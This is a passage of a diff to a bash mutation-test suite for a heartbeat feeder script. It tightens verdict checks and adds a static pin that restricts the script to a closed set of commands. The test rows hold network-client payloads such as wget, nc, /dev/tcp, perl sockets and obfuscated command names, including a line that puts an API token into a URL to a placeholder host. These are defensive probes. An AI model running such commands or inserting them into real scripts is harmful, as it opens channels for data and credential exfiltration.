   else pass "mutation row $1 ($2) is RED as predicted: the marker no longer carries /$3/ (status $LAST_RC)"; fi
 }
-expect_gained() { # <row> <desc> <ERE>: the MUTANT's run must carry a token the shipped feeder never emits
+expect_gained() { # <row> <desc> <ERE> <status> <verdict>: the MUTANT's run, still ending as <status>+<verdict>, must carry a token the shipped feeder never emits
   cases=$((cases + 1))
   run_case
   local seen; seen="$(markers_of)"
   printf '%s\t%s\t%s\t%s\n' "$1" "$2" "${seen:-none}" "$LAST_RC" >> "$MUT_TABLE"
-  if [[ -z "$seen" ]]; then fail "mutation row $1 ($2) went red for another reason: no verdict line at all (status $LAST_RC)"
+  if ! verdict_holds "$4" "$5"; then fail "mutation row $1 ($2) went red for another reason: status $LAST_RC verdicts [${seen:-none}], expected $4 + verdict=$5"
   elif grep -qE -- "$3" "$OUT"; then pass "mutation row $1 ($2) is RED as predicted: the output now carries /$3/ (status $LAST_RC)"
   else fail "mutation row $1 ($2) SURVIVED: the output never carries /$3/"; fi
 }
@@ -1575,10 +2066,12 @@ expect_residue() { # <row> <desc>: the MUTANT must leave the secret-bearing temp
 # predicted change cannot happen) and one known WRONG REASON (the run goes red, but not as predicted).
 red_drv_survivor() { MUT_TABLE=/dev/null; reset_case; C_ROWS="$(row s3 "$((28 * H))" "$(luks_raw)" | fx ctlr1)"; C_Q=3; expect_red CTL-RED "known survivor" 3 no_qualifying_row 0 beat; }
 red_drv_wrongreason() { MUT_TABLE=/dev/null; reset_case; C_STUB="garbage"; C_ROWS="$(row s3 "$((28 * H))" "$(luks_raw)" | fx ctlr2)"; expect_red CTL-RED "known wrong reason" 3 no_qualifying_row 0 beat; }
-lost_drv_survivor() { MUT_TABLE=/dev/null; reset_case; C_ROWS="$(row s3 "$((26 * H))" "$(luks_raw)" | fx ctll1)"; C_BEATS=1; C_APIS=1; expect_lost CTL-LOST "known survivor" 'verdict=beat'; }
-lost_drv_wrongreason() { MUT_TABLE=/dev/null; reset_case; C_SRC="$WORK/mut/noverdict.sh"; expect_lost CTL-LOST "known wrong reason" 'NEVER_PRESENT_ZZ'; }
-gained_drv_survivor() { MUT_TABLE=/dev/null; reset_case; C_ROWS="$(row s3 "$((26 * H))" "$(luks_raw)" | fx ctlg1)"; C_BEATS=1; C_APIS=1; expect_gained CTL-GAIN "known survivor" 'NEVER_PRESENT_ZZ'; }
-gained_drv_wrongreason() { MUT_TABLE=/dev/null; reset_case; C_SRC="$WORK/mut/noverdict.sh"; expect_gained CTL-GAIN "known wrong reason" 'anything'; }
+lost_drv_survivor() { MUT_TABLE=/dev/null; reset_case; C_ROWS="$(row s3 "$((26 * H))" "$(luks_raw)" | fx ctll1)"; C_BEATS=1; C_APIS=1; expect_lost CTL-LOST "known survivor" 'verdict=beat' 0 beat; }
+lost_drv_wrongreason() { MUT_TABLE=/dev/null; reset_case; C_SRC="$WORK/mut/noverdict.sh"; expect_lost CTL-LOST "known wrong reason" 'NEVER_PRESENT_ZZ' 0 beat; }
+lost_drv_othervalid() { MUT_TABLE=/dev/null; reset_case; C_STUB="garbage"; C_ROWS="$(row s3 "$((26 * H))" "$(luks_raw)" | fx ctll3)"; expect_lost CTL-LOST "another valid verdict (query_failed)" 'NEVER_PRESENT_ZZ' 0 beat; }
+gained_drv_survivor() { MUT_TABLE=/dev/null; reset_case; C_ROWS="$(row s3 "$((26 * H))" "$(luks_raw)" | fx ctlg1)"; C_BEATS=1; C_APIS=1; expect_gained CTL-GAIN "known survivor" 'NEVER_PRESENT_ZZ' 0 beat; }
+gained_drv_wrongreason() { MUT_TABLE=/dev/null; reset_case; C_SRC="$WORK/mut/noverdict.sh"; expect_gained CTL-GAIN "known wrong reason" 'anything' 0 beat; }
+gained_drv_othervalid() { MUT_TABLE=/dev/null; reset_case; C_STUB="garbage"; C_ROWS="$(row s3 "$((26 * H))" "$(luks_raw)" | fx ctlg3)"; expect_gained CTL-GAIN "another valid verdict (query_failed)" 'verdict=query_failed' 0 beat; }
 residue_drv_survivor() { MUT_TABLE=/dev/null; reset_case; C_ROWS="$(row s3 "$((26 * H))" "$(luks_raw)" | fx ctle1)"; C_BEATS=1; C_APIS=1; expect_residue CTL-RES "known survivor"; }
 static_drv_survivor() { static_red CTL-STATIC "$FEEDER_SRC" slash-fail-literal; }
 static_drv_wrongreason() { static_red CTL-STATIC "$M_CTL_STATIC" slash-fail-literal; }
@@ -1588,8 +2081,10 @@ own_ctl "expect_red() reports SURVIVED for a known survivor" "SURVIVED" red_drv_
 own_ctl "expect_red() reports another-reason for a known wrong-reason mutant" "went red for another reason" red_drv_wrongreason
 own_ctl "expect_lost() reports SURVIVED for a known survivor" "SURVIVED" lost_drv_survivor
 own_ctl "expect_lost() reports another-reason when the run has no verdict" "went red for another reason" lost_drv_wrongreason
+own_ctl "expect_lost() reports another-reason when the run ends in a different VALID verdict (query_failed), however the token reads" "went red for another reason" lost_drv_othervalid
 own_ctl "expect_gained() reports SURVIVED for a known survivor" "SURVIVED" gained_drv_survivor
 own_ctl "expect_gained() reports another-reason when the run has no verdict" "went red for another reason" gained_drv_wrongreason
+own_ctl "expect_gained() reports another-reason when the run ends in a different VALID verdict (query_failed), even though the token appears" "went red for another reason" gained_drv_othervalid
 own_ctl "expect_residue() reports SURVIVED when no temp file is left behind" "SURVIVED" residue_drv_survivor
 own_ctl "static_red() fails for a known survivor (the shipped feeder lacks the violation)" "expected static violation" static_drv_survivor
 own_ctl "static_red() fails for a known wrong-reason mutant (a different violation)" "expected static violation" static_drv_wrongreason
@@ -1887,17 +2382,17 @@ expect_red R4 "the exception guard removed: {n:3, exception:...} beats" 3 query_
 # R5: newest_dt=none on an empty window; R6: elapsed_ms on the markers
 land r5 'if [[ "$QN" == 0 ]]; then QNEWEST="none"; fi' ':'; _m="$M"
 reset_case; C_SRC="$_m"; C_ROWS="$(printf '' | fx r5)"; C_Q=3
-expect_lost R5 "newest_dt=none dropped: an empty window names the epoch" 'newest_dt=none'
+expect_lost R5 "newest_dt=none dropped: an empty window names the epoch" 'newest_dt=none' 3 no_qualifying_row
 land r6 'elapsed_ms=$(elapsed_ms)' ''; _m="$M"
 reset_case; C_SRC="$_m"; C_ROWS="$(row s3 "$((26 * H))" "$(luks_raw)" | fx r6)"; C_BEATS=1; C_APIS=1
-expect_lost R6 "elapsed_ms dropped from the marker" 'elapsed_ms='
+expect_lost R6 "elapsed_ms dropped from the marker" 'elapsed_ms=' 0 beat
 # R7: the cost withhold text
 land r7a 'The cron cost-capture path, the log shipper or the Logs source may be dark; this line does not say which.' 'The checked host is dark.'; _m="$M"
 reset_case; C_SRC="$_m"; C_TARGET="$T_COST"; C_ROWS="$(printf '' | fx r7a)"
-expect_gained R7a "the cost withhold asserts a dark host" 'checked host is dark'
+expect_gained R7a "the cost withhold asserts a dark host" 'checked host is dark' 3 no_qualifying_row
 land r7b 'see the cost-marker section (Querying Anthropic cost markers) of knowledge-base/engineering/operations/runbooks/betterstack-log-query.md.' 'see the runbook.'; _m="$M"
 reset_case; C_SRC="$_m"; C_TARGET="$T_COST"; C_ROWS="$(printf '' | fx r7b)"
-expect_lost R7b "the cost withhold loses its next-action pointer" 'cost-marker section'
+expect_lost R7b "the cost withhold loses its next-action pointer" 'cost-marker section' 3 no_qualifying_row
 # R8: the secret-bearing helper stderr file is removed on every exit
 land r8 'if [[ -n "$tmp_err" ]]; then rm -f -- "$tmp_err"; fi' ':'; _m="$M"
 reset_case; C_SRC="$_m"; C_ROWS="$(row s3 "$((26 * H))" "$(luks_raw)" | fx r8)"; C_BEATS=1; C_APIS=1
@@ -1906,10 +2401,31 @@ expect_residue R8 "cleanup_tmp no longer removes the helper stderr file"
 land r9 'or ((.pagination.next // null) != null) then "count\t"' 'or ((.pagination | length) > 0) then "count\t"'; _m="$M"
 reset_case; C_SRC="$_m"; C_ROWS="$(row s3 "$((26 * H))" "$(luks_raw)" | fx r9)"; C_APIS=1
 expect_red R9 "any non-empty pagination object read as a further page: the real page shape fails closed" 0 beat 4 beat_failed
+# ERT: the EPOCHREALTIME reads tolerate a bash that has none (`${EPOCHREALTIME-}`, not the bare expansion under set -u).
+land ert1 'T0_US="${EPOCHREALTIME-}"; T0_US="${T0_US//[.,]/}"' 'T0_US="${EPOCHREALTIME//[.,]/}"'; _m="$M"
+reset_case; C_SRC="$_m"; C_NOERT=1; C_ROWS="$(row s3 "$((26 * H))" "$(luks_raw)" | fx ert1)"; C_BEATS=0; C_APIS=0; C_Q=0; run_case
+cases=$((cases + 1))
+if [[ "$LAST_RC" != 0 && "$LAST_RC" != 3 ]] && grep -q 'EPOCHREALTIME: unbound variable' "$OUT" && ! grep -q 'verdict=' "$OUT"; then pass "mutation row ERT-1 is RED: the bare T0_US read dies under set -u (status $LAST_RC, unbound variable, no verdict at all)"
+else fail "mutation row ERT-1: expected a non-contract status with an unbound-variable error and no verdict, got $LAST_RC [$(markers_of)]"; fi
+land ert2 '  local now="${EPOCHREALTIME-}"; now="${now//[.,]/}"' '  local now="${EPOCHREALTIME//[.,]/}"'; _m="$M"
+reset_case; C_SRC="$_m"; C_NOERT=1; C_ROWS="$(row s3 "$((26 * H))" "$(luks_raw)" | fx ert2)"; C_BEATS=1; C_APIS=1
+expect_lost ERT-2 "the bare per-marker read: the marker loses elapsed_ms=na (the subshell dies under set -u)" 'elapsed_ms=na( |$)' 0 beat
+
 # R10: the caller's locale cannot widen [0-9]
 land r10 'export LC_ALL=C' ':'; _m="$M"
 reset_case; C_SRC="$_m"; C_STUB="arabicnewest"; C_LCALL="en_US.utf8"; C_ROWS="$(printf '' | fx r10)"; C_BEATS=1; C_APIS=1
-expect_lost R10 "the LC_ALL=C export removed: Arabic-Indic digits pass the newest shape" 'newest_dt=unparsed'
+# The mutant can only differ from the shipped feeder under a locale whose [0-9] is wider than ASCII. Without
+# en_US.utf8 installed the same run cannot tell them apart and would read as a false SURVIVED, so the row is
+# SKIPPED OUT LOUD instead (still one counted case, so the exact floors do not depend on the host's locales).
+if (( HAVE_UTF8_LOCALE )); then
+  expect_lost R10 "the LC_ALL=C export removed: Arabic-Indic digits pass the newest shape" 'newest_dt=unparsed' 0 beat
+else
+  cases=$((cases + 1))
+  if ! grep -qiE '^en_US\.utf-?8$' <<<"$(locale -a 2>/dev/null)" || [[ "$(LC_ALL=en_US.utf8 "$BASH_BIN" -c : 2>&1)" == *"cannot change locale"* ]]; then
+    printf '  SKIP: R10 needs the en_US.utf8 locale, which this host does not have; the mutant cannot be told from the shipped feeder here\n'
+    pass "R10 skipped explicitly (no en_US.utf8 on this host; the locale probe agrees)"
+  else fail "R10 was skipped but the locale probe disagrees: en_US.utf8 is usable"; fi
+fi
 
 # --- static pins: no second network client, HB_URL use, select_target labels ---------------------------------------
 _i=0
@@ -1919,6 +2435,62 @@ for _payload in 'wget -q -O /dev/null example.invalid' 'nc -z example.invalid 80
   $_payload"; _m="$M"
   static_red "NET$_i" "$_m" network-client-other-than-curl
 done
+# H1: the closed command set. Each payload is a way to run a program the denylist above does not name (or a way to
+# hide the name); every one must trip the closed-set pin in the class that fits, and the row must have landed.
+_i=0
+while IFS='|' read -r -u 3 _cls _payload; do
+  [[ -n "$_cls" ]] || continue
+  _i=$((_i + 1))
+  land "cs$_i" '  local body crc' "  local body crc
+  $_payload"; _m="$M"
+  case "$_cls" in
+    outside) static_red "CS$_i" "$_m" command-word-outside-closed-set ;;
+    indirect) static_red "CS$_i" "$_m" command-word-indirect ;;
+    query) static_red "CS$_i" "$_m" query-command-word-unpinned ;;
+    funcset) static_red "CS$_i" "$_m" function-set-changed ;;
+    curlcount) static_red "CS$_i" "$_m" curl-command-word-count ;;
+  esac
+done 3<<'CSROWS'
+outside|/usr/bin/wget -q example.invalid
+outside|/usr/bin/env wget -q example.invalid
+indirect|"wget" -q example.invalid
+indirect|'wget' -q example.invalid
+indirect|${W}get -q example.invalid
+indirect|$(echo wget) -q example.invalid
+indirect|`echo wget` -q example.invalid
+outside|gh api -X POST repos/x/y/dispatches
+outside|dig example.invalid
+outside|host example.invalid
+outside|nslookup example.invalid
+outside|ping -c1 example.invalid
+outside|git ls-remote https://example.invalid/$BETTERSTACK_API_TOKEN_READONLY
+outside|python3 -I /dev/stdin
+outside|perl -MIO::Socket::INET -e 1
+outside|node -p 1
+outside|aws s3 ls
+outside|rsync -a x example.invalid:
+outside|logger -n example.invalid x
+outside|http example.invalid
+outside|lynx example.invalid
+outside|bash -c 'wget -q example.invalid'
+outside|sh -c 'wget -q example.invalid'
+outside|eval "wget -q example.invalid"
+outside|exec 3<>/dev/tcp/example.invalid/80
+outside|command wget -q example.invalid
+outside|xargs wget
+outside|true && wget -q example.invalid
+outside|echo x | wget -q example.invalid
+outside|: "$(wget -q example.invalid)"
+outside|FOO=1 wget -q example.invalid
+outside|if wget -q example.invalid; then true; fi
+outside|case x in x) wget -q example.invalid ;; esac
+outside|zz=$(wget -q example.invalid)
+outside|[[ -n "$(wget -q example.invalid)" ]]
+outside|{ wget -q example.invalid; }
+query|"$QUERY" "$SQL"
+funcset|nc() { true; }
+curlcount|curl --disable --noproxy '*' -fsS --max-time 5 https://example.invalid
+CSROWS
 land hb1 '  local body crc' '  local body crc
   : "$HB_URL"'; _m="$M"
 static_red HB1 "$_m" HB_URL-use-unexpected
@@ -2031,14 +2603,18 @@ if s.count(sys.argv[3]) != 1:
 open(sys.argv[2], "w").write(s.replace(sys.argv[3], sys.argv[4]))
 PYX
   then
-    if workflow_violations "$out" 2>&1 | grep -qx "$4"; then pass "mutation row $1 is RED as predicted: $4"
-    else fail "mutation row $1 SURVIVED or went red for another reason (wanted $4): [$(workflow_violations "$out" 2>&1 | paste -sd, -)]"; fi
+    local _wv; _wv="$(workflow_violations "$out" 2>&1)"
+    if grep -qx -- "$4" <<<"$_wv"; then pass "mutation row $1 is RED as predicted: $4"
+    elif [[ -z "$_wv" ]]; then fail "mutation row $1 SURVIVED: no workflow pin tripped (wanted $4)"
+    else fail "mutation row $1 went red for another reason (wanted $4): [$(paste -sd, - <<<"$_wv")]"; fi
   else fail "mutation row $1 did NOT land"; fi
 }
 wfm_drv_absent() { wfm CTL-WFS 'TEXT_NOT_IN_THE_WORKFLOW_ZZ' x some-violation; }
 wfm_drv_survivor() { wfm CTL-WFS 'timeout-minutes: 6' 'timeout-minutes: 6 ' no-such-violation; }
+wfm_drv_wrongreason() { wfm CTL-WFS 'timeout-minutes: 6' 'timeout-minutes: 8' no-such-violation; }
 own_ctl "wfm() fails when the edit does not land" "did NOT land" wfm_drv_absent
-own_ctl "wfm() fails for a known survivor (a no-op edit cannot trip a pin)" "SURVIVED or went red for another reason" wfm_drv_survivor
+own_ctl "wfm() reports SURVIVED for a known survivor (a no-op edit trips no pin)" "SURVIVED: no workflow pin tripped" wfm_drv_survivor
+own_ctl "wfm() reports another-reason when a DIFFERENT pin trips (timeout-minutes-not-6, not the one wanted)" "went red for another reason" wfm_drv_wrongreason
 wfm WFS-1 '          strip_log_injection() {' '          curl -s https://example.invalid >/dev/null
           strip_log_injection() {' curl-in-run-block
 wfm WFS-2 'sentry-ingest-domain: ${{ secrets.SENTRY_INGEST_DOMAIN }}' 'sentry-ingest-domain: ${{ secrets.SENTRY_INGEST_DOMAIN }}
@@ -2059,6 +2635,8 @@ WF_RUN_OVERRIDE="$(wf_mut_file wm4 '>> "$GITHUB_STEP_SUMMARY"' '>> /dev/null')";
 wf_run "$STUB_PAUSED" "GITHUB_STEP_SUMMARY=$WORK/wf/summary.txt"; wf_mut_red WM-4 "the UNARMED line is no longer written to the step summary" "$(p_unarmed; echo $?)"
 WF_RUN_OVERRIDE="$(wf_mut_file wm5 'echo "::warning::deadman heartbeat ${t} is UNARMED (paused)"' 'echo "::warning::deadman heartbeat ${t} is UNARMED (paused): no page can fire"')"; cases=$((cases + 1)); [[ -n "$WF_RUN_OVERRIDE" ]] && pass "mutation row WM-5 landed" || fail "mutation row WM-5 did NOT land"
 wf_run "$STUB_PAUSED" "GITHUB_STEP_SUMMARY=$WORK/wf/summary.txt"; wf_mut_red WM-5 "the public log claims that no page can fire" "$(p_unarmed; echo $?)"
+WF_RUN_OVERRIDE="$(wf_mut_file wm6 $'trap_remapped).\n            reason=""\n' $'trap_remapped).\n')"; cases=$((cases + 1)); [[ -n "$WF_RUN_OVERRIDE" ]] && pass "mutation row WM-6 landed" || fail "mutation row WM-6 did NOT land"
+wf_run "$STUB_STALE"; wf_mut_red WM-6 "the per-marker reason reset removed: the earlier marker's reason rides onto trap_remapped" "$(p_stale; echo $?)"
 unset WF_RUN_OVERRIDE
 
 # The feeder's helper-stderr temp file can carry a credential-bearing error body: after every run in this suite
@@ -2078,17 +2656,18 @@ if (( passes + fails != cases )); then
   printf 'FATAL: verdict conservation violated — %s+%s != %s cases.\n' "$passes" "$fails" "$cases" >&2
   exit 1
 fi
-# HARD-CODED floors, EXACT: each equals the measured count of this file, so deleting any one case trips it (a
-# runtime-derived floor falls with the case). Adding a case means raising them to the counts printed on the
-# "=== N passed ... M beat-call assertions ===" line above.
-MIN_PASSES=392
-MIN_BEAT_ASSERTS=116
-if (( passes < MIN_PASSES )); then
-  printf 'FATAL: only %s passes, below the floor of %s -- the suite was truncated, so a 0-failure tally proves nothing.\n' "$passes" "$MIN_PASSES" >&2
+# HARD-CODED floors, EXACT: each equals the measured count of this file and is compared with `!=`, so deleting a
+# case AND adding one both trip it (a `<` floor lets a suite grow, or swap a deleted case for an unrelated one,
+# unnoticed). A runtime-derived floor falls with the case. Changing a case means setting them to the counts printed
+# on the "=== N passed ... M beat-call assertions ===" line above.
+MIN_PASSES=514
+MIN_BEAT_ASSERTS=117
+if (( passes != MIN_PASSES )); then
+  printf 'FATAL: %s passes, the exact floor is %s -- the suite was truncated or extended; a 0-failure tally proves nothing until the floor is re-derived.\n' "$passes" "$MIN_PASSES" >&2
   exit 1
 fi
-if (( beat_asserts < MIN_BEAT_ASSERTS )); then
-  printf 'FATAL: only %s beat-call assertions, below the floor of %s.\n' "$beat_asserts" "$MIN_BEAT_ASSERTS" >&2
+if (( beat_asserts != MIN_BEAT_ASSERTS )); then
+  printf 'FATAL: %s beat-call assertions, the exact floor is %s.\n' "$beat_asserts" "$MIN_BEAT_ASSERTS" >&2
   exit 1
 fi
 (( fails == 0 )) || exit 1
